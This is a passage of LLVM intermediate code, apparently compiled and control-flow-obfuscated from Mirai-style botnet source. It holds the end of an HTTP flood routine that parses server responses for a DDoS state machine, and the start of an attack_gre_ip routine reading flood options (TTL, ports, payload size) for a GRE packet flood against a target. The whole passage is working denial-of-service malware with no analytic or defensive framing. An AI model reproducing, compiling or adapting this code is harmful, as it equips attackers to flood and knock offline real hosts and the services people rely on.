  %2315 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2315, i32 0, i32 18
  %2317 = load i32, i32* %60, align 4
  %2318 = sext i32 %2317 to i64
  %2319 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2316, i64 0, i64 %2318
  %2320 = call i32 @util_strcpy(i8* %2314, i8* %2319)
  %2321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2321, i32 0, i32 16
  %2323 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2323, i32 0, i32 15
  %2325 = load i32, i32* %2324, align 4
  %2326 = sext i32 %2325 to i64
  %2327 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2322, i64 0, i64 %2326
  %2328 = getelementptr inbounds [128 x i8], [128 x i8]* %2327, i32 0, i32 0
  %2329 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2330 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2329, i32 0, i32 16
  %2331 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2331, i32 0, i32 15
  %2333 = load i32, i32* %2332, align 4
  %2334 = sext i32 %2333 to i64
  %2335 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2330, i64 0, i64 %2334
  %2336 = getelementptr inbounds [128 x i8], [128 x i8]* %2335, i32 0, i32 0
  %2337 = call i32 @util_strlen(i8* %2336)
  %2338 = sext i32 %2337 to i64
  %2339 = getelementptr inbounds i8, i8* %2328, i64 %2338
  %2340 = call i32 @util_strcpy(i8* %2339, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2341 = load i32, i32* %61, align 4
  %2342 = add nsw i32 %2341, 3
  %2343 = load i32, i32* %60, align 4
  %2344 = add nsw i32 %2343, %2342
  store i32 %2344, i32* %60, align 4
  %2345 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2346 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2345, i32 0, i32 18
  %2347 = load i32, i32* %60, align 4
  %2348 = sext i32 %2347 to i64
  %2349 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2346, i64 0, i64 %2348
  %2350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2350, i32 0, i32 17
  %2352 = load i32, i32* %2351, align 4
  %2353 = load i32, i32* %60, align 4
  %2354 = sub nsw i32 %2352, %2353
  %2355 = call i32 @util_memsearch(i8* %2349, i32 %2354, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2355, i32* %61, align 4
  %2356 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2356, i32 0, i32 18
  %2358 = load i32, i32* %60, align 4
  %2359 = load i32, i32* %61, align 4
  %2360 = sub nsw i32 %2359, 1
  %2361 = add nsw i32 %2358, %2360
  %2362 = sext i32 %2361 to i64
  %2363 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2357, i64 0, i64 %2362
  store i8 0, i8* %2363, align 1
  %2364 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2365 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2364, i32 0, i32 16
  %2366 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2367 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2366, i32 0, i32 15
  %2368 = load i32, i32* %2367, align 4
  %2369 = sext i32 %2368 to i64
  %2370 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2365, i64 0, i64 %2369
  %2371 = getelementptr inbounds [128 x i8], [128 x i8]* %2370, i32 0, i32 0
  %2372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2372, i32 0, i32 16
  %2374 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2375 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2374, i32 0, i32 15
  %2376 = load i32, i32* %2375, align 4
  %2377 = sext i32 %2376 to i64
  %2378 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2373, i64 0, i64 %2377
  %2379 = getelementptr inbounds [128 x i8], [128 x i8]* %2378, i32 0, i32 0
  %2380 = call i32 @util_strlen(i8* %2379)
  %2381 = sext i32 %2380 to i64
  %2382 = getelementptr inbounds i8, i8* %2371, i64 %2381
  %2383 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2383, i32 0, i32 18
  %2385 = load i32, i32* %60, align 4
  %2386 = sext i32 %2385 to i64
  %2387 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2384, i64 0, i64 %2386
  %2388 = call i32 @util_strcpy(i8* %2382, i8* %2387)
  %2389 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2390 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2389, i32 0, i32 15
  %2391 = load i32, i32* %2390, align 4
  %2392 = add nsw i32 %2391, 1
  store i32 %2392, i32* %2390, align 4
  store i32 1193141542, i32* %switchVar
  br label %loopEnd

; <label>:2393:                                   ; preds = %loopEntry
  %2394 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2394, i32 0, i32 14
  store i32 -1, i32* %2395, align 4
  %2396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2396, i32 0, i32 1
  store i8 10, i8* %2397, align 4
  store i32 -477070303, i32* %switchVar
  br label %loopEnd

; <label>:2398:                                   ; preds = %loopEntry
  store i32 -111800272, i32* %switchVar
  br label %loopEnd

; <label>:2399:                                   ; preds = %loopEntry
  store i32 -546231447, i32* %switchVar
  br label %loopEnd

; <label>:2400:                                   ; preds = %loopEntry
  %2401 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2402 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2401, i32 0, i32 14
  %2403 = load i32, i32* %2402, align 4
  %2404 = icmp eq i32 %2403, 0
  %2405 = select i1 %2404, i32 26781273, i32 921885251
  store i32 %2405, i32* %switchVar
  br label %loopEnd

; <label>:2406:                                   ; preds = %loopEntry
  %2407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2407, i32 0, i32 13
  %2409 = load i32, i32* %2408, align 4
  %2410 = icmp eq i32 %2409, 1
  %2411 = select i1 %2410, i32 455646465, i32 568960918
  store i32 %2411, i32* %switchVar
  br label %loopEnd

; <label>:2412:                                   ; preds = %loopEntry
  %2413 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2413, i32 0, i32 18
  %2415 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2414, i32 0, i32 0
  %2416 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2417 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2416, i32 0, i32 17
  %2418 = load i32, i32* %2417, align 4
  %2419 = call i32 @util_memsearch(i8* %2415, i32 %2418, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2420 = icmp ne i32 %2419, -1
  %2421 = select i1 %2420, i32 -1143746132, i32 -8407909
  store i32 %2421, i32* %switchVar
  br label %loopEnd

; <label>:2422:                                   ; preds = %loopEntry
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 18
  %2425 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2424, i32 0, i32 0
  %2426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2426, i32 0, i32 17
  %2428 = load i32, i32* %2427, align 4
  %2429 = call i32 @util_memsearch(i8* %2425, i32 %2428, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2429, i32* %62, align 4
  %2430 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2430, i32 0, i32 18
  %2432 = load i32, i32* %62, align 4
  %2433 = sub nsw i32 %2432, 2
  %2434 = sext i32 %2433 to i64
  %2435 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2431, i64 0, i64 %2434
  store i8 0, i8* %2435, align 1
  %2436 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2436, i32 0, i32 18
  %2438 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2437, i32 0, i32 0
  %2439 = load i32, i32* %62, align 4
  %2440 = call i32 @util_memsearch(i8* %2438, i32 %2439, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2441 = icmp ne i32 %2440, -1
  %2442 = select i1 %2441, i32 260147410, i32 -751448009
  store i32 %2442, i32* %switchVar
  br label %loopEnd

; <label>:2443:                                   ; preds = %loopEntry
  %2444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2444, i32 0, i32 18
  %2446 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2447 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2446, i32 0, i32 18
  %2448 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2447, i32 0, i32 0
  %2449 = load i32, i32* %62, align 4
  %2450 = call i32 @util_memsearch(i8* %2448, i32 %2449, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2451 = sext i32 %2450 to i64
  %2452 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2445, i64 0, i64 %2451
  store i8 0, i8* %2452, align 1
  store i32 -751448009, i32* %switchVar
  br label %loopEnd

; <label>:2453:                                   ; preds = %loopEntry
  %2454 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2454, i32 0, i32 18
  %2456 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2455, i32 0, i32 0
  %2457 = call i32 @util_atoi(i8* %2456, i32 16)
  store i32 %2457, i32* %63, align 4
  %2458 = load i32, i32* %63, align 4
  %2459 = icmp eq i32 %2458, 0
  %2460 = select i1 %2459, i32 781674776, i32 1479475300
  store i32 %2460, i32* %switchVar
  br label %loopEnd

; <label>:2461:                                   ; preds = %loopEntry
  %2462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2462, i32 0, i32 1
  store i8 1, i8* %2463, align 4
  store i32 -477070303, i32* %switchVar
  br label %loopEnd

; <label>:2464:                                   ; preds = %loopEntry
  %2465 = load i32, i32* %63, align 4
  %2466 = add nsw i32 %2465, 2
  %2467 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2468 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2467, i32 0, i32 14
  store i32 %2466, i32* %2468, align 4
  %2469 = load i32, i32* %62, align 4
  store i32 %2469, i32* %59, align 4
  store i32 -8407909, i32* %switchVar
  br label %loopEnd

; <label>:2470:                                   ; preds = %loopEntry
  store i32 1270638796, i32* %switchVar
  br label %loopEnd

; <label>:2471:                                   ; preds = %loopEntry
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 17
  %2474 = load i32, i32* %2473, align 4
  %2475 = load i32, i32* %59, align 4
  %2476 = sub nsw i32 %2474, %2475
  %2477 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2478 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2477, i32 0, i32 14
  store i32 %2476, i32* %2478, align 4
  %2479 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2479, i32 0, i32 14
  %2481 = load i32, i32* %2480, align 4
  %2482 = icmp eq i32 %2481, 0
  %2483 = select i1 %2482, i32 -1766343306, i32 -2067902709
  store i32 %2483, i32* %switchVar
  br label %loopEnd

; <label>:2484:                                   ; preds = %loopEntry
  %2485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2485, i32 0, i32 1
  store i8 1, i8* %2486, align 4
  store i32 -477070303, i32* %switchVar
  br label %loopEnd

; <label>:2487:                                   ; preds = %loopEntry
  store i32 1270638796, i32* %switchVar
  br label %loopEnd

; <label>:2488:                                   ; preds = %loopEntry
  store i32 921885251, i32* %switchVar
  br label %loopEnd

; <label>:2489:                                   ; preds = %loopEntry
  %2490 = load i32, i32* %59, align 4
  %2491 = icmp eq i32 %2490, 0
  %2492 = select i1 %2491, i32 -1312954682, i32 2034698763
  store i32 %2492, i32* %switchVar
  br label %loopEnd

; <label>:2493:                                   ; preds = %loopEntry
  store i32 -477070303, i32* %switchVar
  br label %loopEnd

; <label>:2494:                                   ; preds = %loopEntry
  %2495 = load i32, i32* %59, align 4
  %2496 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2497 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2496, i32 0, i32 17
  %2498 = load i32, i32* %2497, align 4
  %2499 = sub nsw i32 %2498, %2495
  store i32 %2499, i32* %2497, align 4
  %2500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2500, i32 0, i32 18
  %2502 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2501, i32 0, i32 0
  %2503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2503, i32 0, i32 18
  %2505 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2504, i32 0, i32 0
  %2506 = load i32, i32* %59, align 4
  %2507 = sext i32 %2506 to i64
  %2508 = getelementptr inbounds i8, i8* %2505, i64 %2507
  %2509 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2510 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2509, i32 0, i32 17
  %2511 = load i32, i32* %2510, align 4
  %2512 = sext i32 %2511 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2502, i8* %2508, i64 %2512, i32 1, i1 false)
  %2513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2513, i32 0, i32 18
  %2515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2515, i32 0, i32 17
  %2517 = load i32, i32* %2516, align 4
  %2518 = sext i32 %2517 to i64
  %2519 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2514, i64 0, i64 %2518
  store i8 0, i8* %2519, align 1
  %2520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2520, i32 0, i32 17
  %2522 = load i32, i32* %2521, align 4
  %2523 = icmp eq i32 %2522, 0
  %2524 = select i1 %2523, i32 -684955448, i32 1264442075
  store i32 %2524, i32* %switchVar
  br label %loopEnd

; <label>:2525:                                   ; preds = %loopEntry
  store i32 -477070303, i32* %switchVar
  br label %loopEnd

; <label>:2526:                                   ; preds = %loopEntry
  store i32 -643206501, i32* %switchVar
  br label %loopEnd

; <label>:2527:                                   ; preds = %loopEntry
  store i32 739963328, i32* %switchVar
  br label %loopEnd

; <label>:2528:                                   ; preds = %loopEntry
  store i32 -132963115, i32* %switchVar
  br label %loopEnd

; <label>:2529:                                   ; preds = %loopEntry
  store i32 -1639232257, i32* %switchVar
  br label %loopEnd

; <label>:2530:                                   ; preds = %loopEntry
  %2531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2531, i32 0, i32 1
  %2533 = load i8, i8* %2532, align 4
  %2534 = zext i8 %2533 to i32
  %2535 = icmp eq i32 %2534, 10
  %2536 = select i1 %2535, i32 -943957030, i32 289328012
  store i32 %2536, i32* %switchVar
  br label %loopEnd

; <label>:2537:                                   ; preds = %loopEntry
  store i32 -1134674473, i32* %switchVar
  br label %loopEnd

; <label>:2538:                                   ; preds = %loopEntry
  %2539 = call i32* @__errno_location() #7
  store i32 0, i32* %2539, align 4
  %2540 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2541 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2540, i32 0, i32 0
  %2542 = load i32, i32* %2541, align 4
  %2543 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2544 = call i64 @recv(i32 %2542, i8* %2543, i64 10240, i32 16384)
  %2545 = trunc i64 %2544 to i32
  store i32 %2545, i32* %12, align 4
  %2546 = load i32, i32* %12, align 4
  %2547 = icmp eq i32 %2546, 0
  %2548 = select i1 %2547, i32 1299455729, i32 -887891528
  store i32 %2548, i32* %switchVar
  br label %loopEnd

; <label>:2549:                                   ; preds = %loopEntry
  %2550 = call i32* @__errno_location() #7
  store i32 104, i32* %2550, align 4
  store i32 -1, i32* %12, align 4
  store i32 -887891528, i32* %switchVar
  br label %loopEnd

; <label>:2551:                                   ; preds = %loopEntry
  %2552 = load i32, i32* %12, align 4
  %2553 = icmp eq i32 %2552, -1
  %2554 = select i1 %2553, i32 -1732789274, i32 -45456984
  store i32 %2554, i32* %switchVar
  br label %loopEnd

; <label>:2555:                                   ; preds = %loopEntry
  %2556 = call i32* @__errno_location() #7
  %2557 = load i32, i32* %2556, align 4
  %2558 = icmp ne i32 %2557, 11
  %2559 = select i1 %2558, i32 -359631614, i32 1595203210
  store i32 %2559, i32* %switchVar
  br label %loopEnd

; <label>:2560:                                   ; preds = %loopEntry
  %2561 = call i32* @__errno_location() #7
  %2562 = load i32, i32* %2561, align 4
  %2563 = icmp ne i32 %2562, 11
  %2564 = select i1 %2563, i32 -1282443947, i32 1595203210
  store i32 %2564, i32* %switchVar
  br label %loopEnd

; <label>:2565:                                   ; preds = %loopEntry
  %2566 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2566, i32 0, i32 0
  %2568 = load i32, i32* %2567, align 4
  %2569 = call i32 @close(i32 %2568)
  %2570 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2570, i32 0, i32 0
  store i32 -1, i32* %2571, align 4
  %2572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2572, i32 0, i32 1
  store i8 0, i8* %2573, align 4
  store i32 1595203210, i32* %switchVar
  br label %loopEnd

; <label>:2574:                                   ; preds = %loopEntry
  store i32 708117209, i32* %switchVar
  br label %loopEnd

; <label>:2575:                                   ; preds = %loopEntry
  store i32 -1134674473, i32* %switchVar
  br label %loopEnd

; <label>:2576:                                   ; preds = %loopEntry
  %2577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2577, i32 0, i32 1
  %2579 = load i8, i8* %2578, align 4
  %2580 = zext i8 %2579 to i32
  %2581 = icmp ne i32 %2580, 0
  %2582 = select i1 %2581, i32 -1013195260, i32 -327810222
  store i32 %2582, i32* %switchVar
  br label %loopEnd

; <label>:2583:                                   ; preds = %loopEntry
  %2584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2584, i32 0, i32 1
  store i8 1, i8* %2585, align 4
  store i32 -327810222, i32* %switchVar
  br label %loopEnd

; <label>:2586:                                   ; preds = %loopEntry
  store i32 289328012, i32* %switchVar
  br label %loopEnd

; <label>:2587:                                   ; preds = %loopEntry
  store i32 -1639232257, i32* %switchVar
  br label %loopEnd

; <label>:2588:                                   ; preds = %loopEntry
  store i32 977541859, i32* %switchVar
  br label %loopEnd

; <label>:2589:                                   ; preds = %loopEntry
  store i32 -1140609847, i32* %switchVar
  br label %loopEnd

; <label>:2590:                                   ; preds = %loopEntry
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:2591:                                   ; preds = %loopEntry
  %2592 = load i32, i32* %9, align 4
  %2593 = add nsw i32 %2592, 1
  store i32 %2593, i32* %9, align 4
  store i32 -1512946799, i32* %switchVar
  br label %loopEnd

; <label>:2594:                                   ; preds = %loopEntry
  store i32 127342235, i32* %switchVar
  br label %loopEnd

; <label>:2595:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2594, %2591, %2590, %2589, %2588, %2587, %2586, %2583, %2576, %2575, %2574, %2565, %2560, %2555, %2551, %2549, %2538, %2537, %2530, %2529, %2528, %2527, %2526, %2525, %2494, %2493, %2489, %2488, %2487, %2484, %2471, %2470, %2464, %2461, %2453, %2443, %2422, %2412, %2406, %2400, %2399, %2398, %2393, %2306, %2297, %2264, %2253, %2242, %2238, %2234, %2225, %2219, %2210, %2209, %2200, %2195, %2190, %2186, %2184, %2161, %2149, %2143, %2142, %2135, %2134, %2127, %2118, %2117, %2114, %2111, %2106, %2103, %2095, %2084, %2083, %2082, %2075, %2074, %2073, %2072, %2061, %2048, %2039, %2032, %2031, %2030, %2019, %2006, %1997, %1991, %1986, %1981, %1978, %1973, %1964, %1955, %1945, %1942, %1935, %1924, %1922, %1920, %1913, %1909, %1905, %1902, %1901, %1888, %1869, %1860, %1847, %1834, %1831, %1816, %1807, %1804, %1802, %1794, %1785, %1776, %1768, %1765, %1758, %1746, %1743, %1731, %1724, %1723, %1720, %1719, %1718, %1707, %1698, %1685, %1678, %1677, %1676, %1665, %1652, %1643, %1637, %1632, %1627, %1624, %1619, %1610, %1601, %1591, %1588, %1581, %1568, %1565, %1558, %1546, %1543, %1531, %1524, %1520, %1519, %1518, %1517, %1502, %1497, %1493, %1490, %1489, %1488, %1476, %1469, %1467, %1458, %1455, %1454, %1453, %1444, %1438, %1430, %1415, %1399, %1396, %1387, %1370, %1367, %1350, %1348, %1343, %1333, %1332, %1329, %1328, %1318, %1315, %1308, %1296, %1293, %1281, %1274, %1273, %1272, %1269, %1256, %1253, %1246, %1234, %1231, %1219, %1210, %1209, %1208, %1205, %1192, %1189, %1182, %1170, %1167, %1155, %1146, %1143, %1136, %1133, %1121, %1120, %1116, %1110, %1101, %1091, %1084, %1066, %1065, %1056, %1053, %1049, %1040, %1022, %1021, %1011, %1006, %1005, %1004, %994, %993, %989, %986, %985, %984, %983, %982, %981, %980, %979, %970, %961, %954, %953, %948, %926, %919, %918, %913, %891, %884, %883, %878, %856, %849, %848, %843, %808, %800, %790, %782, %772, %765, %762, %743, %736, %729, %723, %682, %569, %562, %561, %556, %534, %525, %517, %510, %509, %504, %446, %445, %439, %434, %427, %420, %419, %416, %413, %407, %396, %391, %390, %381, %380, %371, %368, %367, %364, %355, %NewDefault, %346, %337, %328, %319, %310, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %301, %271, %234, %206, %163, %158, %153, %152, %148, %145, %144, %135, %126, %117, %111, %110, %109, %104, %103, %98, %97, %92, %91, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #5

declare i32 @sleep(i32) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
